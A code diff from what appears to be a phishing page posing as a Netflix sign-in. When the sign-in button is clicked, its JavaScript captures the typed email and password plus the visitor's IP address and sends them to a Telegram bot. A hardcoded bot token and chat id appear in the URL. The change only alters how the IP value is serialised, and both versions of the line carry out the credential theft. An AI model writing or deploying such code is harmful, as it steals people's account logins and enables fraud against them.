@@ -16,7 +16,7 @@ signin.addEventListener("click", async (ev)=>{
             ev.preventDefault();
     const ip = await fetch("https://api.db-ip.com/v2/free/self")
             console.log("signing in...", ip);
-                const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`NETFLIX  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`
+                const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`NETFLIX  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip.json())}`
     fetch(url, {
         method: "POST",
         headers: { 'Content-Type': 'application/json' },
